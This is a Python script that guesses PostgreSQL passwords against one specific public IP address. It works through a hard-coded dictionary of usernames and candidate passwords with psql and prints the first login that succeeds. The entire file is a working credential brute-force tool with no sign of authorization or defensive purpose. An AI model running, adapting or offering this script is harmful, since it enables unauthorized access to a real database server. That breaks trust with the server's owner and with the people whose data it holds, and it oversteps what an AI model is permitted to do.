#!/usr/bin/env python3
"""Try PostgreSQL passwords on 38.107.234.149"""
import subprocess
import sys

HOST = "38.107.234.149"
USERS_PWS = {
    "lago": ["lago", "Lago", "LAGO", "lag0", "L4go", "lago123", "lagoon",
             "postgres", "password", "admin", "secret", "bult", "BULT",
             "bult123", "lagopass", "changeme", "lago2025", "lago_dev",
             "lago_prod", "bult2025", "Bult2025"],
    "postgres": ["postgres", "postgresql", "admin", "password", "", "secret"],
    "bult": ["bult", "BULT", "bult123", "Bult2025", ""],
}

for user, passwords in USERS_PWS.items():
    for pw in passwords:
        env = {
            "PGPASSWORD": pw,
            "PGHOST": HOST,
            "PGPORT": "5432",
            "PGUSER": user,
            "PGDATABASE": user if user != "postgres" else "postgres",
        }
        try:
            r = subprocess.run(
                ["/usr/local/opt/postgresql@18/bin/psql", "-t", "-c", "SELECT 1"],
                env=env, capture_output=True, text=True, timeout=8
            )
            if "1 row" in r.stdout or "1 row" in r.stderr:
                print("FOUND: {} : {}".format(user, pw))
                sys.exit(0)
            if "password authentication failed" not in r.stderr:
                print("{} : {} -> {}".format(user, pw, r.stderr[:100]))
        except subprocess.TimeoutExpired:
            pass
        except FileNotFoundError:
            print("psql not found")
            sys.exit(1)

print("No password found")
